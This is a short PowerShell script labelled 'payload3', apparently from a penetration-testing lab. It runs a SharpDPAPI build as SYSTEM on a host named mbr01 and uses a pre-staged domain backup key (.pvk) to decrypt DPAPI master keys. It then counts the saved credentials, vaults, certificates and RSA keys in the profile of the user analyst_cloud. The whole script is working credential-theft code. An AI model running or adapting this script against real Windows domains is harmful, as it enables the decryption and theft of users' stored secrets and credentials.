# payload3: run CRTE SharpDPAPI masterkeys /pvk on mbr01 as SYSTEM (files pre-staged)
$tools = 'C:\Windows\Temp\cadre-tools'
Write-Output "SDP_SIZE $((Get-Item "$tools\sdp-crte.exe").Length)"
Write-Output "PVK_SIZE $((Get-Item "$tools\ntds-crte.pvk").Length)"

Write-Output '--- analyst_cloud profile present? ---'
Get-ChildItem 'C:\Users' -Directory -ErrorAction SilentlyContinue | Where-Object { $_.Name -match 'analyst_cloud' } | ForEach-Object { Write-Output "PROFILE $($_.Name)" }

Write-Output '--- masterkeys /pvk (CRTE build) ---'
& "$tools\sdp-crte.exe" masterkeys /pvk:"$tools\ntds-crte.pvk" 2>&1 | ForEach-Object { Write-Output "MK|$_" }

Write-Output '--- analyst_cloud DPAPI dirs ---'
foreach ($p in @(
  'C:\Users\analyst_cloud.CADRE\AppData\Roaming\Microsoft\Protect',
  'C:\Users\analyst_cloud.CADRE\AppData\Roaming\Microsoft\Credentials',
  'C:\Users\analyst_cloud.CADRE\AppData\Local\Microsoft\Credentials',
  'C:\Users\analyst_cloud.CADRE\AppData\Roaming\Microsoft\Vault',
  'C:\Users\analyst_cloud.CADRE\AppData\Roaming\Microsoft\SystemCertificates\My\Certificates',
  'C:\Users\analyst_cloud.CADRE\AppData\Roaming\Microsoft\Crypto\RSA'
)) {
  if (Test-Path $p) {
    $n = (Get-ChildItem $p -File -Recurse -ErrorAction SilentlyContinue | Measure-Object).Count
    Write-Output "DIR $n $p"
  } else { Write-Output "DIR MISSING $p" }
}
Write-Output 'MBR01_35G_V3_DONE'
